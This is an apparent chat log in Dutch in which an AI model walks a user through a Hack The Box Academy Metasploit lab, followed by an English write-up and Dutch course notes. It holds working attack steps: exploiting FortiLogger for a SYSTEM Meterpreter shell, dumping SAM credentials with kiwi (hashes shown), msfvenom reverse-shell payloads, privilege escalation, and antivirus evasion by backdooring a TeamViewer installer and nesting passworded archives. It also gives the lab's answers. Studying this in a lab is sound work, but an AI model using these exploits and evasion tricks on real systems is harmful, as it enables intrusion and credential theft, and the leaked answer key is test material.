Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-16 04:05 -0500
Nmap scan report for 10.129.8.99
Host is up (0.066s latency).
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-02-16T09:05:55+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=WIN-51BJ97BCIPV
| Not valid before: 2026-02-15T08:06:52
|_Not valid after:  2026-08-17T08:06:52
| rdp-ntlm-info: 
|   Target_Name: WIN-51BJ97BCIPV
|   NetBIOS_Domain_Name: WIN-51BJ97BCIPV
|   NetBIOS_Computer_Name: WIN-51BJ97BCIPV
|   DNS_Domain_Name: WIN-51BJ97BCIPV
|   DNS_Computer_Name: WIN-51BJ97BCIPV
|   Product_Version: 10.0.17763
|_  System_Time: 2026-02-16T09:05:47+00:00
5000/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: FortiLogger | Log and Report System
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2026-02-16T09:05:48
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.68 seconds

┌──(kali㉿kali)-[~]
4:06 AM

Geweldig! Nu zie ik belangrijke informatie:

    Poort 5000: Microsoft IIS/10.0 met "FortiLogger | Log and Report System"
    Windows versie: 10.0.17763 (dit is Windows Server 2019)
    SMB: SMB2/SMB3 is beschikbaar
    Hostname: WIN-51BJ97BCIPV

De belangrijkste aanwijzing is FortiLogger op poort 5000. Dit is waarschijnlijk waar de kwetsbaarheid zit!

FortiLogger heeft bekende exploits in Metasploit. Laat me zoeken naar FortiLogger exploits.
Done

Uitstekend! Nu zie ik het doel:
Belangrijke bevindingen:

    Poort 5000: IIS 10.0 met "FortiLogger | Log and Report System"
    Windows versie: 10.0.17763 (Windows Server 2019)
    SMB2 is beschikbaar

De exploit die je nodig hebt: FortiLogger!

FortiLogger heeft een bekende Arbitrary File Upload kwetsbaarheid. Laten we die gebruiken:
In Metasploit:
bash

msfconsole

# Zoek naar FortiLogger exploits:
search fortilogger

# Je zou moeten zien:
# exploit/windows/http/fortilogger_arbitrary_fileupload

use exploit/windows/http/fortilogger_arbitrary_fileupload

# Configureer de exploit:
set RHOSTS 10.129.8.99
set RPORT 5000
set LHOST 10.10.14.17
show options

# Run de exploit:
exploit
# of
run

Zodra je een Meterpreter shell hebt:
bash

# Vraag 1: Check de username
getuid

# Als je access denied krijgt, kijk naar de processen:
ps

# Mogelijk moet je migreren of escaleren

Voor Vraag 2 (NTLM hash):
bash

# Eerst check of je voldoende rechten hebt:
getuid

# Als je SYSTEM bent of Administrator:
hashdump

# Zoek naar "htb-student" in de output
# Het formaat is: username:RID:LM_hash:NTLM_hash:::
# Submit alleen de NTLM hash (het deel na de tweede dubbele punt)

Probeer dit en laat me weten wat je krijgt! 🎯

C:\Windows\system32>getuid
getuid
'getuid' is not recognized as an internal or external command,
operable program or batch file.
C:\Windows\system32>whoimi
whoimi
'whoimi' is not recognized as an internal or external command,
operable program or batch file.
C:\Windows\system32>getuid
getuid
'getuid' is not recognized as an internal or external command,
operable program or batch file.
C:\Windows\system32>
4:18 AM

Ah! De gebruiker heeft een gewone Windows command shell, GEEN Meterpreter shell! Daarom werken de Meterpreter commando's niet.

In een gewone Windows shell moet je gebruiken:

    whoami (niet whoimi, dat was een typo van de gebruiker)
    net user voor user info
    Andere Windows commando's

Laten me helpen:

    Eerst de username krijgen met whoami
    Dan voor de NTLM hash - dat is lastiger vanuit een gewone shell. Je hebt verschillende opties:
        Mimikatz gebruiken (maar dat moet je uploaden)
        Terug naar Metasploit en een Meterpreter payload gebruiken
        Andere post-exploitation tools

Het beste is waarschijnlijk om een Meterpreter shell te upgraden vanuit deze shell, OF om de exploit opnieuw te runnen maar dan met een Meterpreter payload.
Done

Ah! Je hebt een gewone Windows command shell, geen Meterpreter shell! Daarom werken die commando's niet.
Vraag 1: Username ophalen

In een gewone Windows shell gebruik je:
cmd

whoami

(Je typte "whoimi" - let op de spelling: whoami)

Dit geeft je de username voor vraag 1! ✅
Vraag 2: NTLM hash ophalen

Voor de NTLM hash heb je een Meterpreter shell nodig. Je hebt 2 opties:
Optie A: Upgrade naar Meterpreter (aanbevolen)

In je huidige shell:
cmd

exit

Dan in Metasploit, run de exploit opnieuw maar zorg dat de payload Meterpreter is:
bash

use exploit/windows/http/fortilogger_arbitrary_fileupload
set RHOSTS 10.129.8.99
set RPORT 5000
set LHOST 10.10.14.17

# Controleer dat de payload Meterpreter is:
show payloads
set payload windows/meterpreter/reverse_tcp

# Run opnieuw:
exploit

Optie B: Vanuit je huidige shell

Als je al admin rechten hebt, probeer dit:
cmd

# Check of je admin bent:
net user %username%

# Of:
net localgroup administrators

Als je admin bent, kun je proberen:
cmd

reg save HKLM\SAM C:\sam.save
reg save HKLM\SYSTEM C:\system.save

Maar een Meterpreter shell is veel makkelijker voor het dumpen van hashes.

Probeer eerst whoami voor vraag 1, dan laten we een Meterpreter shell krijgen voor vraag 2! 🎯

msf exploit(windows/http/fortilogger_arbitrary_fileupload) > run
[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. FortiLogger version 4.4.2.2
[+] Generate Payload
[+] Payload has been uploaded
[*] Executing payload...
[*] Sending stage (190534 bytes) to 10.129.8.99
[*] Meterpreter session 2 opened (10.10.14.17:4444 -> 10.129.8.99:49709) at 2026-02-16 04:43:15 -0500
meterpreter > net user %username%
[-] Unknown command: net. Run the help command for more details.
meterpreter >
4:43 AM

Perfect! De gebruiker heeft nu een Meterpreter shell. Laten me helpen met beide vragen.

Voor vraag 1 moet de gebruiker getuid gebruiken in Meterpreter (niet net user - dat is een Windows command).

Voor vraag 2 moet de gebruiker hashdump gebruiken om de NTLM hashes te krijgen.
Done

Perfect! Je hebt nu een Meterpreter shell! 🎉

In Meterpreter gebruik je andere commando's:
Vraag 1: Username
bash

getuid

Dit geeft je de username waarmee je de shell hebt gekregen! ✅
Vraag 2: NTLM hash van htb-student
bash

hashdump
```

Dit geeft een lijst van alle users met hun hashes in dit formaat:
```
username:RID:LM_hash:NTLM_hash:::
```

**Zoek de regel met "htb-student"** en kopieer alleen het **NTLM hash** deel (het 4de veld, na de 3de dubbele punt).

**Voorbeeld:**
```
htb-student:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::

In dit voorbeeld is de NTLM hash: 64f12cddaa88057e06a81b54e73b949b
Als hashdump niet werkt (access denied):

Probeer dit:
bash

# Check je huidige privileges:
getprivs

# Probeer privilege escalation:
getsystem

# Dan opnieuw:
hashdump

Of gebruik:
bash

lsa_dump_sam

Run deze commando's en je hebt beide antwoorden! 🎯

NT AUTHORITY\SYSTEM
4:44 AM

Perfect! De gebruiker heeft getuid uitgevoerd en het resultaat is NT AUTHORITY\SYSTEM. Dit is het antwoord op vraag 1!

Nu moet de gebruiker hashdump uitvoeren om de NTLM hash van htb-student te krijgen voor vraag 2.

Aangezien ze al SYSTEM rechten hebben, zou hashdump zonder problemen moeten werken.
Done

Uitstekend! 🎉
✅ Vraag 1 beantwoord!

Username: NT AUTHORITY\SYSTEM

Dit is de hoogste privilege level op een Windows systeem - je hebt volledige controle!
Vraag 2: NTLM hash ophalen

Omdat je al SYSTEM bent, zou dit zonder problemen moeten werken:
bash

hashdump
```

Je krijgt output zoals:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:NTLM_HASH_HIER:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:NTLM_HASH_HIER:::
htb-student:1001:aad3b435b51404eeaad3b435b51404ee:NTLM_HASH_HIER:::

Zoek de regel met "htb-student" en kopieer het 4de veld (na de 3de dubbele punt).

Dat is je NTLM hash voor vraag 2! ✅

Run hashdump en je bent klaar! 🎯

meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: Incorrect function.
meterpreter >
4:45 AM

De hashdump commando faalt. Dit kan gebeuren zelfs als je SYSTEM bent. Laten we alternatieven proberen:

    lsa_dump_sam - dit is vaak betrouwbaarder
    run post/windows/gather/smart_hashdump - dit is een post-exploitation module
    Migreren naar een ander proces
    Kerberos tickets dumpen

Laten we deze opties geven.
Done

Geen probleem! Dit gebeurt soms. Laten we alternatieven proberen:
Optie 1: lsa_dump_sam (meestal betrouwbaarder)
bash

lsa_dump_sam

Dit dumpt de SAM database op een andere manier en zou moeten werken.
Optie 2: Load kiwi en gebruik mimikatz
bash

load kiwi
lsa_dump_sam

Of:
bash

load kiwi
creds_all

Optie 3: Smart Hashdump module
bash

run post/windows/gather/smart_hashdump

Deze module probeert verschillende methodes automatisch.
Optie 4: Process migratie (als laatste optie)

Soms helpt het om naar een ander proces te migreren:
bash

ps
# Zoek naar een proces zoals lsass.exe, services.exe of winlogon.exe
# Noteer de PID

migrate <PID>
# Dan opnieuw:
hashdump

Probeer eerst lsa_dump_sam - dat werkt meestal! 🎯

meterpreter > net user %username%
[-] Unknown command: net. Run the help command for more details.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: Incorrect function.
meterpreter > meterpreter > hashdump
[-] Unknown command: meterpreter. Run the help command for more details.
meterpreter > [-] priv_passwd_get_sam_hashes: Operation failed: Incorrect function.
[-] Unknown command: [-]. Run the help command for more details.
meterpreter > meterpreter >
4:45 AM

De gebruiker probeert commando's in te voeren maar krijgt errors. Het lijkt erop dat ze wat verwarde invoer hebben (zoals "meterpreter > meterpreter >" en "[-] priv_passwd_get_sam_hashes...").

Laat me duidelijke, opgeschoonde commando's geven die ze moeten proberen. hashdump werkt niet, dus laten we de alternatieven proberen.
Done

Je kopieert de output mee in je commando's 😊 Typ alleen de commando's zelf.

Probeer deze alternatieven (één voor één):
Commando 1:
bash

lsa_dump_sam

Commando 2 (als dat niet werkt):
bash

load kiwi

En dan:
bash

creds_all

Commando 3 (als dat niet werkt):
bash

run post/windows/gather/smart_hashdump

Commando 4 (als laatste optie):
bash

shell

Dit geeft je een Windows command prompt. Dan typ:
cmd

reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

Typ exit om terug te gaan naar Meterpreter, en dan:
bash

download sam.save
download system.save

Begin met het eerste commando: lsa_dump_sam en laat me weten wat je krijgt! 🎯

meterpreter > meterpreter >lsa_dump_sam
[-] Unknown command: meterpreter. Run the help command for more details.
meterpreter >
4:46 AM

De gebruiker kopieert steeds de "meterpreter >" prompt mee in zijn commando's. Ik moet hem duidelijk maken dat hij ALLEEN het commando moet typen, niet de prompt zelf.

Hij typt: "meterpreter >lsa_dump_sam"
Hij moet typen: "lsa_dump_sam"

Laat me dit heel duidelijk maken met een visueel voorbeeld.
Done

Stop! Je typt de prompt mee 😊

JE ZIET: meterpreter >
JIJ MOET TYPEN: lsa_dump_sam

NIET typen: meterpreter >lsa_dump_sam ❌

Typ alleen dit (zonder "meterpreter >"):

lsa_dump_sam

Druk op Enter.

Voorbeeld:

    ❌ FOUT: meterpreter >lsa_dump_sam
    ✅ GOED: lsa_dump_sam

Probeer opnieuw! 🎯

[-] Unknown command: meterpreter. Run the help command for more details.
meterpreter > lsa_dump_sam
[-] The "lsa_dump_sam" command requires the "kiwi" extension to be loaded (run: load kiwi)
meterpreter >
4:47 AM

Perfect! Nu zien we de echte foutmelding. De lsa_dump_sam commando vereist dat de kiwi extensie eerst wordt geladen.
Done

Perfect! Nu zien we het probleem. Typ dit:

load kiwi

Wacht tot het geladen is, dan typ:

lsa_dump_sam

Dit zou nu moeten werken! 🎯

meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : WIN-51BJ97BCIPV
SysKey : c897d22c1c56490b453e326f86b2eef8
Local SID : S-1-5-21-2348711446-3829538955-3974936019
SAMKey : e52d743c76043bf814df6e48f1efcb23
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: bdaffbfe64f1fc646a3353be1c2c3c99
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : d0e507b237b40a3a1f62ba1935465406
* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-51BJ97BCIPVAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 545c81812fc803221b22e47ab8789c104f38b151c677fbc4006894db6d174f1b
      aes128_hmac       (4096) : 5d59bcd0e74c5ed8951b9f2b658eef43
      des_cbc_md5       (4096) : 76436b1c190d892a
    OldCredentials
      aes256_hmac       (4096) : a394ab9b7c712a9e0f3edb58404f9cf086132d29ab5b796d937b197862331b07
      aes128_hmac       (4096) : 7630dab9bdaeebf9b4aa6c595347a0cc
      des_cbc_md5       (4096) : 9876615285c2766e
    OlderCredentials
      aes256_hmac       (4096) : 09c55a10e6b955caac4abbf7ff37b81488a2ede67a150c00c775fa00d94768ab
      aes128_hmac       (4096) : b49643128581ac08a1fae957f7787f72
      des_cbc_md5       (4096) : d32592d63b75ec1f
* Packages *
    NTLM-Strong-NTOWF
* Primary:Kerberos *
    Default Salt : WIN-51BJ97BCIPVAdministrator
    Credentials
      des_cbc_md5       : 76436b1c190d892a
    OldCredentials
      des_cbc_md5       : 9876615285c2766e
RID  : 000001f5 (501)
User : Guest
RID  : 000001f7 (503)
User : DefaultAccount
RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 4b4ba140ac0767077aee1958e7f78070
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 92793b2cbb0532b4fbea6c62ee1c72c8
* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c34300ce936f766e6b0aca4191b93dfb576bbe9efa2d2888b3f275c74d7d9c55
      aes128_hmac       (4096) : 6b6a769c33971f0da23314d5cef8413e
      des_cbc_md5       (4096) : 61299e7a768fa2d5
* Packages *
    NTLM-Strong-NTOWF
* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 61299e7a768fa2d5
RID  : 000003ea (1002)
User : htb-student
  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : f88979e2a6999b5cbc7a9308e7b4cd82
* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-51BJ97BCIPVhtb-student
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1ed226feb91bfd21489a12a58c6cb38b99ab70feb30d971c8987fb44bcb15213
      aes128_hmac       (4096) : 629343148027bcf0d48cf49b066a9960
      des_cbc_md5       (4096) : 379791d616ef6d0e
* Packages *
    NTLM-Strong-NTOWF
* Primary:Kerberos *
    Default Salt : WIN-51BJ97BCIPVhtb-student
    Credentials
      des_cbc_md5       : 379791d616ef6d0e
meterpreter >
4:48 AM

Perfect! De gebruiker heeft de output van lsa_dump_sam en ik kan duidelijk de NTLM hash voor htb-student zien:

Zoek naar:

RID  : 000003ea (1002)
User : htb-student
  Hash NTLM: cf3a5525ee9414229e66279623ed5c58

De NTLM hash is: cf3a5525ee9414229e66279623ed5c58

Dit is het antwoord op vraag 2!
Done

🎉 Perfect! Je hebt het!
✅ Vraag 2 beantwoord!

Zoek naar deze regels in de output:

RID  : 000003ea (1002)
User : htb-student
  Hash NTLM: cf3a5525ee9414229e66279623ed5c58

NTLM hash voor htb-student:

cf3a5525ee9414229e66279623ed5c58

Samenvatting van je antwoorden:

✅ Vraag 1 - Username van de shell:
NT AUTHORITY\SYSTEM

✅ Vraag 2 - NTLM hash van htb-student:
cf3a5525ee9414229e66279623ed5c58

Submit deze antwoorden en je bent klaar! 🎯🏆


# CPTS Metasploit Lab Writeup

## Target Information

- **Target IP**: 10.129.8.99
- **Machine**: ACADEMY-MSF2-WIN02

---

## Reconnaissance

### Initial Nmap Scan

bash

```bash
nmap 10.129.8.99
```

**Open Ports:**

- 135/tcp - msrpc
- 139/tcp - netbios-ssn
- 445/tcp - microsoft-ds (SMB)
- 3389/tcp - ms-wbt-server (RDP)
- **5000/tcp - upnp**
- 5985/tcp - wsman (WinRM)

### Detailed Service Scan

bash

```bash
nmap -sV -sC -Pn -p 135,139,445,3389,5000,5985 10.129.8.99
```

**Key Finding:**

- Port 5000: Microsoft IIS 10.0
- Service: **FortiLogger | Log and Report System**
- OS: Windows Server 2019 (10.0.17763)

---

## Exploitation

### Step 1: Search for FortiLogger Exploit

bash

```bash
msfconsole
search fortilogger
```

**Result:**

- `exploit/windows/http/fortilogger_arbitrary_fileupload`

### Step 2: Configure the Exploit

bash

```bash
use exploit/windows/http/fortilogger_arbitrary_fileupload
set RHOSTS 10.129.8.99
set RPORT 5000
set LHOST 10.10.14.17
set payload windows/meterpreter/reverse_tcp
show options
```

### Step 3: Execute the Exploit

bash

````bash
run
```

**Success Output:**
```
[+] The target is vulnerable. FortiLogger version 4.4.2.2
[+] Payload has been uploaded
[*] Meterpreter session 2 opened
````

---

## Post-Exploitation

### Privilege Check

bash

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

✅ **Answer 1: NT AUTHORITY\SYSTEM**

---

### Hash Extraction

#### Load Kiwi Extension

bash

```bash
meterpreter > load kiwi
```

#### Dump SAM Database

bash

````bash
meterpreter > lsa_dump_sam
```

**Output (htb-student):**
```
RID  : 000003ea (1002)
User : htb-student
  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
````

✅ **Answer 2: cf3a5525ee9414229e66279623ed5c58**

---

## Summary

|Question|Answer|
|---|---|
|**1. Username of shell**|`NT AUTHORITY\SYSTEM`|
|**2. NTLM hash (htb-student)**|`cf3a5525ee9414229e66279623ed5c58`|

### Attack Chain

1. Discovered FortiLogger 4.4.2.2 on port 5000
2. Exploited arbitrary file upload vulnerability
3. Gained SYSTEM-level access
4. Extracted NTLM hashes using Mimikatz (Kiwi)

---

## Key Takeaways

- Always perform detailed service enumeration
- FortiLogger < 5.2.0 is vulnerable to arbitrary file upload
- Kiwi (Mimikatz) is essential for Windows credential extraction
- SYSTEM privileges allow full SAM database access



---

# Het Metasploit Framework Gebruiken

**Pagina 12: Modules Schrijven & Importeren**

## Modules Schrijven en Importeren

Om nieuwe Metasploit-modules te installeren die al door andere gebruikers zijn omgezet (geport), kun je de `msfconsole` bijwerken via de terminal. Dit zorgt ervoor dat alle nieuwste exploits, auxiliaries en functies worden geïnstalleerd. Zolang de gepoorte modules zijn toegevoegd aan de hoofd-branch van het Metasploit-framework op GitHub, blijf je up-to-date.

Als je echter alleen een specifieke module nodig hebt en geen volledige upgrade wilt uitvoeren, kun je die module handmatig downloaden en installeren. We focussen ons op het zoeken in **ExploitDB** naar beschikbare Metasploit-modules die we lokaal kunnen importeren.

### ExploitDB

ExploitDB is een uitstekende keuze voor het zoeken naar aangepaste exploits. Met tags kun je filteren op verschillende scenario's. De tag **Metasploit Framework (MSF)** toont alleen scripts die beschikbaar zijn in het Metasploit-moduleformaat (.rb). Deze kun je direct downloaden en in je lokale Metasploit-map plaatsen.

#### Voorbeeld: Zoeken naar Nagios3

Stel dat we een exploit voor Nagios3 willen gebruiken (command injection in `statuswml.cgi`). Als we in `msfconsole` zoeken, vinden we deze mogelijk niet:

Codefragment

```
msf6 > search nagios
```

_(Resultaat toont diverse Nagios XI exploits, maar niet de specifieke statuswml.cgi variant)_.

Dit betekent dat ons framework niet up-to-date is of dat de module niet in de officiële release zit. We kunnen dan **searchsploit** (de CLI-versie van ExploitDB) gebruiken:

Bash

```
leonwintweer@htb[/htb]$ searchsploit nagios3
```

Dit toont onder andere: `Nagios3 - 'statuswml.cgi' Command Injection (Metasploit) | unix/webapps/9861.rb`.

> **Let op:** Bestanden die eindigen op `.rb` zijn Ruby-scripts. Vaak zijn deze specifiek gemaakt voor Metasploit, maar niet altijd.

---

## Modules Installeren

Je moet het `.rb`-bestand downloaden en in de juiste map plaatsen.

- **Standaardmap:** `/usr/share/metasploit-framework/modules/`
    
- **Gebruikersmap (hidden):** `~/.msf4/modules/`
    

### Mappenstructuur en Naamgeving

Het is belangrijk dat je de mappenstructuur van de hoofdmap nabootst in je eigen `.msf4`-map (bijv. `mkdir -p ~/.msf4/modules/exploits/unix/webapp/`).

**Naamgevingsconventies:** Gebruik altijd **snake_case** (kleine letters en underscores), geen streepjes.

- _Goed:_ `nagios3_command_injection.rb`
    
- _Fout:_ `nagios3-command-injection.rb`
    

### Laden van de nieuwe module

Nadat je het bestand hebt gekopieerd, kun je het laden in Metasploit:

1. Gebruik het `loadpath`-commando: `loadpath /usr/share/metasploit-framework/modules/`
    
2. Of gebruik `reload_all` binnen `msfconsole`.
    

---

## Scripts Omzetten naar Metasploit Modules

Om een script (Python, PHP, etc.) om te zetten naar een Metasploit-module, moet je de programmeertaal **Ruby** leren. Je hoeft echter niet vanaf nul te beginnen; je kunt een bestaande module als sjabloon (boilerplate) gebruiken.

### Voorbeeld: Bludit Auth Bruteforce Bypass

We willen een script voor Bludit 3.9.2 importeren. We kijken eerst wat er al in de map staat:

Bash

```
ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit
```

Als we een bestaande Bludit-exploit vinden, gebruiken we die code als basis.

### De Anatomie van een Module

Een module begint met `include` statements (mixins). Deze voegen functionaliteit toe:

- `Msf::Exploit::Remote::HttpClient`: Voor interactie met webservers.
    
- `Msf::Exploit::PhpEXE`: Voor PHP-payloads.
    
- `Msf::Exploit::FileDropper`: Voor het opschonen van bestanden na de sessie.
    

In de `initialize`-functie vul je de metadata in:

- **Name & Description:** Wat doet de exploit?
    
- **Author:** Wie heeft het ontdekt en wie heeft de module geschreven?
    
- **References:** CVE-nummers en URL's naar de kwetsbaarheid.
    
- **Targets:** Voor welke softwareversies is dit geschikt?
    

### Opties Registreren

Met `register_options` definieer je welke variabelen de gebruiker moet instellen (zoals `RHOSTS`, `USER`, of een wordlist via `OptPath`).

Ruby

```
register_options([
  OptString.new('TARGETURI', [true, 'Het pad naar Bludit', '/']),
  OptPath.new('PASSWORDS', [true, 'Wachtwoordenlijst', File.join(Msf::Config.data_directory, "wordlists", "passwords.txt")])
])
```


# Het Metasploit Framework Gebruiken

**Pagina 13: Introductie tot MSFVenom**

## Introductie tot MSFVenom

**MSFVenom** is de opvolger van MSFPayload en MSFEncode, twee losse scripts die voorheen samenwerkten met msfconsole om gebruikers te voorzien van aanpasbare en moeilijk te detecteren payloads.

MSFVenom is het resultaat van het samenvoegen van deze twee tools. Voorheen moesten we het resultaat van MSFPayload (gebruikt voor het genereren van shellcode) via een pipe (`|`) doorsturen naar MSFEncode. Dit werd gebruikt om "bad characters" te verwijderen en om oudere antivirussoftware (AV) of Intrusion Prevention/Detection systemen (IPS/IDS) te omzeilen.

Tegenwoordig biedt de gecombineerde tool een methode om snel payloads te maken voor verschillende architecturen en besturingssystemen. Het omzeilen van AV is echter complexer geworden; moderne software gebruikt heuristische analyse, machine learning en deep packet inspection, waardoor simpelweg 'encoderen' vaak niet meer genoeg is.

---

## Payloads Creëren

Stel dat we een open FTP-poort hebben gevonden met zwakke inloggegevens of anonieme toegang. Deze FTP-server is gekoppeld aan een webservice op poort 80. Als de webservice geen controles uitvoert op geüploade bestanden, kunnen we een PHP- of ASPX-shell uploaden via FTP en deze via de browser activeren.

### Stap 1: Scannen en FTP Toegang

Uit een Nmap-scan blijkt dat poort 21 (FTP) en poort 80 (IIS 7.5) open staan. We loggen anoniem in op de FTP-server en zien een map genaamd `aspnet_client`. Dit wijst erop dat de server **.aspx** bestanden kan uitvoeren.

### Stap 2: Payload Genereren

We gebruiken MSFVenom om een reverse shell-bestand aan te maken:

Bash

```
leonwintweer@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```

### Stap 3: Luisteren en Uitvoeren

Voordat we het bestand op de webserver openen, starten we een listener in Metasploit:

Codefragment

```
msf6 > use multi/handler
msf6 > set LHOST 10.10.14.5
msf6 > set LPORT 1337
msf6 > run
```

Wanneer we nu naar `http://10.10.10.5/reverse_shell.aspx` navigeren, wordt de payload uitgevoerd en ontvangen we een Meterpreter-sessie.

---

## Local Exploit Suggester

In dit voorbeeld krijgen we toegang als de gebruiker `IIS APPPOOL\Web`. Deze gebruiker heeft zeer weinig rechten. Om ons privileges te verhogen (Privilege Escalation), gebruiken we de **Local Exploit Suggester**.

### De Suggester gebruiken:

1. Zoek de module: `search local exploit suggester`.
    
2. Gebruik de module: `use post/multi/recon/local_exploit_suggester`.
    
3. Stel de actieve sessie in: `set SESSION 2`.
    
4. Voer de module uit: `run`.
    

De tool controleert het systeem op bekende kwetsbaarheden en geeft een lijst met mogelijke exploits terug die ons van een normale gebruiker naar **SYSTEM** kunnen helpen.

---

## Local Privilege Escalation

Uit de lijst van de suggester kiezen we de exploit `ms10_015_kitrap0d`.

### De Escalatie uitvoeren:

Codefragment

```
msf6 > use exploit/windows/local/ms10_015_kitrap0d
msf6 > set SESSION 3
msf6 > set LPORT 1338
msf6 > run
```

Na uitvoering wordt een nieuwe Meterpreter-sessie geopend. Als we nu het commando `getuid` uitvoeren, zien we dat we volledige controle hebben over het systeem:

**Server username: NT AUTHORITY\SYSTEM**


# Het Metasploit Framework Gebruiken

**Pagina 14: Firewall en IDS/IPS Evasie**

## Firewall en IDS/IPS Evasie

Om te leren hoe we een doelwit efficiënt en onopgemerkt kunnen aanvallen, moeten we eerst begrijpen hoe een doelwit verdedigd wordt. We introduceren twee termen:

1. **Endpoint Protection (Eindpuntbeveiliging):** Beveiliging van een individuele host (pc, workstation of server) middels softwarepakketten zoals antivirus, antimalware en persoonlijke firewalls (bijv. Avast, BitDefender).
    
2. **Perimeter Protection (Perimeterbeveiliging):** Fysieke of virtuele apparaten aan de rand van het netwerk (zoals firewalls en IDS/IPS) die de toegang van buiten (publiek) naar binnen (privé) reguleren.
    

### Detectiemethoden

Beveiligingsmechanismen werken op basis van "allow" (toestaan) en "deny" (weigeren) regels. De detectie gebeurt op verschillende manieren:

|**Methode**|**Beschrijving**|
|---|---|
|**Signature-based**|Vergelijkt pakketten met bekende aanvalspatronen (handtekeningen).|
|**Heuristische Analyse**|Zoekt naar afwijkend gedrag ten opzichte van een normale "baseline".|
|**Stateful Protocol Analysis**|Controleert of protocollen zich houden aan de standaard definities.|
|**Live-monitoring (SOC)**|Analisten bewaken het netwerk handmatig via een Security Operations Center.|

---

## Evasietechnieken (Ontwijking)

### 1. Encryptie van Verkeer

Sinds MSF6 kan `msfconsole` de communicatie tussen een Meterpreter-shell en de aanvalsmachine versleutelen met **AES-encryptie**. Dit helpt enorm bij het omzeilen van netwerkgebaseerde IDS/IPS-systemen die naar onversleutelde bekende patronen zoeken.

### 2. Executable Templates & Backdooring

Standaard payloads worden direct herkend door antivirussoftware. Met `msfvenom` kunnen we echter een legitiem programma (bijv. een TeamViewer-installatiebestand) gebruiken als "template". We injecteren onze payload hierin, waardoor de kwaadaardige code verborgen wordt in een legitiem product.

**Voorbeeld van een 'backdoored' executable:**

Bash

```
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

- De `-x` vlag gebruikt het echte programma als template.
    
- De `-k` vlag zorgt ervoor dat het originele programma gewoon blijft werken terwijl de payload in een aparte thread draait.
    

### 3. Archieven met Wachtwoord

Het plaatsen van een payload in een archief (zoals .zip of .rar) met een **wachtwoord** blokkeert de scanmogelijkheden van de meeste antivirusprogramma's, omdat ze de inhoud niet kunnen "lezen" zonder het wachtwoord.

**De testmethode:**

1. Maak een payload.
    
2. Pak deze in met een wachtwoord (bijv. met `rar`).
    
3. Verwijder de extensie (bijv. hernoem `test.rar` naar `test`).
    
4. Pak dit bestand opnieuw in met een wachtwoord en verwijder weer de extensie.
    

Zoals te zien in de VirusTotal-scan uit de tekst, kan dit de detectieratio verlagen naar **0/49**.

### 4. Packers

Een **Packer** (zoals UPX of Themida) comprimeert de executable en voegt decompressiecode toe. Pas bij het uitvoeren wordt de echte code in het geheugen hersteld. Dit voegt een extra laag obfuscatie (verduistering) toe.

### 5. Exploit Coding & Randomisatie

Bij het schrijven van exploits (zoals een Buffer Overflow) kunnen vaste patronen in het geheugen (zoals een lange reeks NOP-instructies of een vast hexadecimaal bufferpatroon) alarmbellen doen afgaan. Door **randomisatie** toe te voegen aan de buffers en de "Offset", breek je de statische handtekeningen van een IDS/IPS.

---

**Tip:** Evasie is een kat-en-muisspel. Het is aanbevolen om je technieken eerst te testen in een sandbox-omgeving (zoals een eigen VM met Windows Defender) voordat je ze inzet tijdens een assessment.


# Het Metasploit Framework Gebruiken

**Pagina 15: Metasploit-Framework Updates - Augustus 2020**

## Metasploit-Framework Updates - Augustus 2020

